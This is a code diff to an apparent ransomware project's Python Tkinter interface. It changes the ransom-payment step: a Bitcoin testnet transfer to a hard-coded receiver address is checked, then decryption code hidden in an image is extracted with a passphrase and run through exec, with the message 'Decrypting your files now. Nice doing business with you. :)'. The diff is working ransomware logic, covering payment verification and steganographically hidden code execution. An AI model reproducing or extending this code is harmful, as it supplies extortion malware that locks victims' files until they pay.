@@ -1,4 +1,6 @@
 from tkinter import *
+
+import bitcoinlib.transactions
 from PIL import Image, ImageTk
 from bitcoinlib.wallets import wallet_exists, wallet_create_or_open
 from bitcoinlib.services.services import Service
@@ -23,7 +25,6 @@ def clicking_submit():
             wallet = wallet_create_or_open(wallet_name,
                                            password=wallet_password,
                                            network="testnet")
-            wallet.utxos_update()
             print(f"Wallet Address: {wallet.get_key().address}")
             round += 1
             for widget in window.winfo_children():
@@ -114,56 +115,71 @@ def setup_round_2():
 
 def setup_round_3():
     # The address of my testnet bitcoin wallet
-    receiver_address: str = "tb1q502wsjnar03w82u56cxrn7yhrltc5w6kzxfrz9"
+    #receiver_address: str = "tb1q502wsjnar03w82u56cxrn7yhrltc5w6kzxfrz9"
+    receiver_address: str = "tb1q8fwk4r7tvt5zm6xc40ucd5mljesdj2jyt5hpea"
+    wallet.utxos_update()
+    try:
+        # Carries out the transaction
+        wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet", fee=1000)
+    except Exception as e:
+        print(f"Transaction failed: {e}")
+        return
+    # Query transaction details
+    try:
+        service = Service(network="testnet")
+        transaction_details = service.gettransaction(wallet_transaction.txid)
 
-    # Carries out the transaction
-    wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet")
+        if isinstance(transaction_details, bool):
+            # The transaction was not found or failed
+            print("Transaction details could not be retrieved. Please verify the transaction ID.")
+            return
 
-    # Queries through the testnet database to retrieve
-    service = Service(network="testnet")
-    transaction_details = service.gettransaction(wallet_transaction.txid)
+        if isinstance(transaction_details, bitcoinlib.transactions.Transaction):
+            # Extract outputs and check if the transaction is successful
+            print(f"Transaction retrieved successfully: {transaction_details}")
+            for output in transaction_details.outputs:
+                if output['address'] == receiver_address:
+                    print(f"Transaction successful! Sent {amount_to_send} tBTC to {receiver_address}")
 
-    #  Iterates through transaction details to retrieve the
-    transaction_details = transaction_details.get('outputs', [])
-    for output in transaction_details:
-        address = output.get('address')
-        # Checks if the user successfully sent the specified number of bitcoins
-        if address == receiver_address:
-            import os
-            # Extracts the key from a specified image
-            with open("passphrase.txt", "r") as file:
-                lines = file.readlines()
-                passphrase = lines[0].strip("\n")
+                    transaction_details_label = Label(text="Transaction successful", fg="blue")
+                    transaction_details_label.pack()
 
-            with open("images.txt", "r") as file:
-                lines = file.readlines()
-                image_containing_decryption_code: str = lines[3].strip("\n")
+                    successful_transaction_label = Label(
+                        text="Decrypting your files now. Nice doing business with you. :)",
+                        fg="green")
+                    successful_transaction_label.pack()
 
-            try:
-                decryption_code_found: bool = os.path.exists(image_containing_decryption_code)
-                if decryption_code_found:
-                    code_to_decrypt_files: str = extract_file(image_containing_decryption_code, passphrase)
-                else:
-                    raise FileNotFoundError(
-                        f"The image name/path {image_containing_decryption_code} doesn't exist in the current directory."
-                        f"Either the name fed to the variable in the code to be updated or the image "
-                        f"specified just doesn't exist.")
-            except FileNotFoundError as fnfe:
-                print(f"File Not Found: {fnfe}")
-                return
-            except Exception as e:
-                print(f"An unexpected error occurred: {e}")
-                return
+                    import os
+                    # Extracts the key from a specified image
+                    with open("passphrase.txt", "r") as file:
+                        lines = file.readlines()
+                        passphrase = lines[0].strip("\n")
 
-            transaction_details_label = Label(text=transaction_details, fg="blue")
-            transaction_details_label.pack()
+                    with open("images.txt", "r") as file:
+                        lines = file.readlines()
+                        image_containing_decryption_code: str = lines[3].strip("\n")
 
-            successful_transaction_label = Label(text="Decrypting your files now. Nice doing business with you. :)",
-                                                 fg="green")
-            successful_transaction_label.pack()
-            exec("import decrypt")
-            exec(f"{code_to_decrypt_files}")
-    print(f"\nTransaction Details: {transaction_details}")
+                    try:
+                        decryption_code_found: bool = os.path.exists(image_containing_decryption_code)
+                        if decryption_code_found:
+                            code_to_decrypt_files: str = extract_file(image_containing_decryption_code, passphrase)
+                            exec("import decrypt")
+                            exec(f"{code_to_decrypt_files}")
+                            print(f"\nTransaction Details: {transaction_details}")
+                        else:
+                            raise FileNotFoundError(
+                                f"The image name/path {image_containing_decryption_code} doesn't exist in the current directory."
+                                f"Either the name fed to the variable in the code to be updated or the image "
+                                f"specified just doesn't exist.")
+                    except FileNotFoundError as fnfe:
+                        print(f"File Not Found: {fnfe}")
+                        return
+            print("Receiver address not found in transaction outputs.")
+        else:
+            print("Unexpected transaction details type returned.")
+    except Exception as e:
+        print(f"Failed to retrieve transaction details: {e}")
+
 
 # Main Window Setup
 window = Tk()
